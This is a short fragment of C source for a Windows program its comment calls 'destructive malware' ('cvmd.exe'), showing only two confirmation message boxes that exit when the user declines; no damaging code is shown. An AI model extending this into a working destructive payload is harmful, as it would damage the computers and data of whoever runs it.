...
// This destructive malware will harm your PC!
...
int main() {
    if (MessageBoxW(NULL, L"DO YOU REALLY WANT TO EXECUTE THIS DESTRUCTIVE MALWARE?!", L"cvmd.exe by VietNamLover", 
                    MB_YESNO | MB_ICONEXCLAMATION) == IDNO) {
        ExitProcess(0);
    }
    
    if (MessageBoxW(NULL, L"THIS IS THE LAST WARNING! IT WILL HARM YOUR PC! STILL EXECUTE IT?! ", 
                    L"cvmd.exe", MB_YESNO | MB_ICONEXCLAMATION) == IDNO) {
        ExitProcess(0);
    }
